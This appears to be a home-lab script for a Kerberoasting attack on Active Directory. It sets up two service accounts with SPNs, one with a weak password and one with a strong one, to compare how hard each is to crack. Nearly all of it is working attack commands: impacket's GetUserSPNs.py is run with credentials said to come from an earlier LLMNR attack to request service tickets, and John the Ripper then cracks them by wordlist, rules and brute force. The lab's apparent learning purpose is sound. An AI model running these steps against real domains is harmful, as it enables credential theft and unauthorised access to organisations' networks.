# This is the Kerberoasting attack. It is performed from a Kali Linux machine.

# Required setup for an AD home lab that does not have any service accounts with SPNs registered. In a real setting, it is expected that there are already existing SPNs, so skip this step. 

# 1. First, two service accounts are created, svcWeb with an easy to break password, and svcSQL with a difficult to break password. The motivation for this is investigating how big of a difference a strong password makes in decryption attempts.


# In PowerShell on DC (or other server VM):

# Create account with easy to break password
New-ADUser svcWeb  -SamAccountName svcWeb  -AccountPassword (ConvertTo-SecureString 'iloveyou1' -AsPlainText -Force) -Enabled $true

# Create account with strong password
New-ADUser svcSQL  -SamAccountName svcSQL  -AccountPassword (ConvertTo-SecureString '!TryBr3akMeN0tPoss#bleY' -AsPlainText -Force) -Enabled $true

# 2. Next, we assigned the HTTP service to the svcWeb account (guessable password service account) and registered its SPN. We then configured the MSSQL service under svcSQL (hard to break password) and registered its SPN. 
# Once the SPNs are created in the AD, we can proceed to the attack itself. 


# In PowerShell, still on the DC, run:

# HTTP service on the DC itself
setspn -s HTTP/DomainC.offensive.local svcWeb

# MSSQL service on the DC
setspn -s MSSQLSvc/DomainC.offensive.local:1433 svcSQL


# Attack steps:

# Step 0: Attack prerequisite: A user account with their credentials is needed for the attack. We use the franky.lanie account for which we obtained the password after the LLMNR attack.

# Step 1: Find if any SNPs are available. Install impacket: sudo apt install python3-impacket

# Navigate to the python3-impacket/examples folder on your machine. Usually in /usr/share/doc/python3-impacket/examples. Run the following:
python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2

# Step 2: Make the ticket requests (TGS and TGT).

# Now with the -request flag
python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2 -request

# Step 3: Save the outputs, each in their own txt file. cd to a location where you can create files. We saved them in Documents.

# extract the easy "ticket" (checksum + enc ticket) ; corresponding to account with weak password to a txt file
echo 'manually copy the output value here' > easy_output.txt

# extract the hard "ticket" (checksum + enc ticket); corresponding to account with strong password to a txt file
echo 'manually copy the output value here' > hard_output.txt

# Step 4: use John the Ripper to crack the passwords. To get the tool: sudo apt install john

# wordlist attack using rockyou.txt on the easy output
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt easy_output.txt 

# wordlist attack using rockyou.txt on the hard output
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hard_output.txt 

# wordlist attack using rockyou.txt on the hard output using rules now
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hard_output.txt

# brute forcing password
john --format=krb5tgs --incremental hard_output.txt
